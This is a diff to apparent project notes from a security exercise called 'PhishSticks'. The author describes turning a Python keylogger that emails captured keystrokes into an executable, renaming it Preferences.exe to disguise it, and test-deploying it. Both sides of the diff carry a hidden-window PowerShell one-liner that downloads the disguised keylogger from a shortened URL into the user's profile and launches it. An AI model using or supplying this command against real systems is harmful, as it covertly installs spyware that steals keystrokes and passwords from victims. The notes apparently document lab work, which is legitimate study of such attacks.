@@ -169,11 +169,11 @@ I found this already made python keylogger from [thepythoncode.com](https://thep
 
 The python keylogger script offers an option to send given keystrokes to an email, so I made an email for our project and added it to our version of the script. Next thing I did was: convert .py file to .exe file and add some nice icon to it. I did this like I had previously done [here.](https://github.com/therealhalonen/PhishSticks/blob/master/notes/rajala/notes.md#4102023)
 
-To test this, I uploaded the [keylog.exe](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog.exe) and used basically the same command that I had used with the ransomware application:
+To test this, I uploaded the [keylog.exe](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/keylogger/keylog_python/keylog.exe) and used basically the same command that I had used with the ransomware application:
 
 I shortened the link so it fits in the Run bar and disguised the keylog.exe to Preferences.exe for fun:
 ```
-powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/yc53e7vs', \"$env:UserProfile/Preferences.exe\");Start-Process \"$env:UserProfile/Preferences.exe\" -WorkingDir \"$env:UserProfile\""
+powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/43y48zjx', \"$env:UserProfile/Preferences.exe\");Start-Process \"$env:UserProfile/Preferences.exe\" -WorkingDir \"$env:UserProfile\""
 ```
 ![2023-10-24_17-24](https://github.com/therealhalonen/PhishSticks/assets/112076418/7d6782be-f0bb-49a4-9368-893c36d703d0)
 
